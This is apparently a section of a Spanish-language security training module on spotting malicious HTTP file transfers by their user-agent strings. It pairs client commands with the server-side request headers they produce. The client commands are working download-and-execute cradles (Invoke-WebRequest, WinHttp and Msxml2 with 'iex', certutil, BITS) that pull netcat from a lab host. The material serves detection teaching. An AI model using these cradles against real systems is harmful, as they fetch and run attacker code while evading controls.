La detección de la línea de comandos basada en listas negras es fácil de evadir, incluso utilizando una simple ofuscación de mayúsculas y minúsculas. Sin embargo, aunque el proceso de crear listas blancas de todas las líneas de comando en un entorno particular es inicialmente laborioso, es muy robusto y permite una detección y alerta rápida de cualquier línea de comando inusual.

La mayoría de los protocolos cliente-servidor requieren que el cliente y el servidor negocien cómo se entregará el contenido antes de intercambiar información. Esto es común con el protocolo `HTTP`. Existe la necesidad de interoperabilidad entre diferentes servidores web y tipos de navegadores web para garantizar que los usuarios tengan la misma experiencia sin importar su navegador. Los clientes HTTP son reconocidos principalmente por su cadena de agente de usuario, que el servidor utiliza para identificar qué cliente `HTTP` se está conectando, por ejemplo, Firefox, Chrome, etc.

Los agentes de usuario no solo se utilizan para identificar navegadores web, sino que cualquier cosa que actúe como un cliente `HTTP` y se conecte a un servidor web a través de `HTTP` puede tener una cadena de agente de usuario (por ejemplo, `cURL`, un script personalizado de `Python` o herramientas comunes como `sqlmap` o `Nmap`).

Las organizaciones pueden tomar algunas medidas para identificar posibles cadenas de agente de usuario compilando primero una lista de cadenas de agente de usuario legítimas conocidas, agentes de usuario utilizados por procesos de sistema operativo predeterminados, agentes de usuario comunes utilizados por servicios de actualización como Windows Update y actualizaciones de antivirus, etc. Estos pueden ser alimentados en una herramienta SIEM utilizada para la caza de amenazas para filtrar el tráfico legítimo y centrarse en anomalías que pueden indicar un comportamiento sospechoso. Cualquier cadena de agente de usuario de aspecto sospechoso puede ser investigada más a fondo para determinar si se utilizaron para realizar acciones maliciosas. Este [sitio web](http://useragentstring.com/index.php) es útil para identificar cadenas de agente de usuario comunes. Una lista de cadenas de agente de usuario está disponible [aquí](http://useragentstring.com/pages/useragentstring.php).

Las transferencias de archivos maliciosas también pueden detectarse por sus agentes de usuario. Los siguientes agentes de usuario/cabeceras se observaron en técnicas comunes de transferencia `HTTP` (probado en Windows 10, versión 10.0.14393, con PowerShell 5).

### Invoke-WebRequest - Cliente

```r
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

### Invoke-WebRequest - Servidor

```r
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

### WinHttpRequest - Cliente

```r
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

### WinHttpRequest - Servidor

```r
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

### Msxml2 - Cliente

```r
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

### Msxml2 - Servidor

```r
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

### Certutil - Cliente

```r
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

### Certutil - Servidor

```r
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

### BITS - Cliente

```r
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

### BITS - Servidor

```r
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

Esta sección solo rasca la superficie sobre la detección de transferencias de archivos maliciosas. Sería un excelente comienzo para cualquier organización crear una lista blanca de binarios permitidos o una lista negra de binarios conocidos por ser utilizados con fines maliciosos. Además, buscar cadenas de agente de usuario anómalas puede ser una excelente manera de detectar un ataque en progreso. Cubriremos técnicas de detección y caza de amenazas en profundidad en módulos posteriores.